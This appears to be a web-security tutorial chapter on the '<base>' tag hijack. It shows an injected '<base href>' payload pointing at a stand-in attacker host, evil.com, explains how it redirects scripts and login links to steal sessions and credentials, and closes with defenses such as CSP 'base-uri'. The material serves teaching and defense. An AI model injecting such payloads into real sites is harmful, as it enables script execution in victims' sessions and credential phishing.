# 11 - The `<base>` Tag Hijack

## How Relative URLs Work

When a page uses relative paths for resources, the browser resolves them against the page's base URL. By default, the base URL is the page's own origin:

```html
<body>
  <img src="/intl/en_ALL/images/srpr/logo1w.png" />
</body>
```

The browser loads the image from the current domain:

```
https://www.example.com/intl/en_ALL/images/srpr/logo1w.png
```

## The Attack: Injecting `<base href>`

The `<base>` tag overrides the base URL for all relative paths on the page. If an attacker can inject HTML before the page's resources load:

```html
<base href="http://www.evil.com" />
…
<script src="x.js"></script>
…
<img src="y.jpg" />
…
<a href="auth.do">auth</a>
```

Every relative URL now resolves against `http://www.evil.com`:

| Element | Resolved URL |
|---|---|
| `<script src="x.js">` | `http://www.evil.com/x.js` |
| `<img src="y.jpg">` | `http://www.evil.com/y.jpg` |
| `<a href="auth.do">` | `http://www.evil.com/auth.do` |

The attacker hosts malicious versions of these resources on `evil.com`. The browser fetches and executes them as if they came from the original site.

## Why This Is Dangerous

- Scripts load from the attacker's server — full JavaScript execution in the victim's origin context
- Links redirect to the attacker's server — phishing login pages that look legitimate because the user is already on the real site
- Images and other assets can be replaced — visual deception, defacement
- Only one tag needs to be injected — no `<script>` required, which can bypass XSS filters that only look for script tags or event handlers
- The `<base>` tag affects everything below it in the document, so injecting it early in the page maximizes impact

## Attack Scenarios

### Scenario 1: Script Hijacking

The attacker injects `<base href="http://www.evil.com" />` into a page that later loads:

```html
<script src="js/app.js"></script>
```

The browser fetches `http://www.evil.com/js/app.js` — the attacker's script runs with full access to the page's DOM, cookies (if not `HttpOnly`), and session.

### Scenario 2: Phishing via Link Hijacking

A page has:

```html
<a href="login.do">Sign In</a>
```

With the injected `<base>`, clicking "Sign In" navigates to `http://www.evil.com/login.do` — a fake login page that harvests credentials. The user has no reason to suspect anything because they were already on the legitimate site.

## Defenses

- Content Security Policy — `base-uri 'self'` restricts `<base>` to the page's own origin, blocking injected `<base>` tags pointing elsewhere
- Output encoding — prevent HTML injection in the first place
- Use absolute URLs for critical resources (scripts, auth endpoints) so they're not affected by `<base>`
- Sanitize input to strip `<base>` tags — though this is fragile compared to CSP
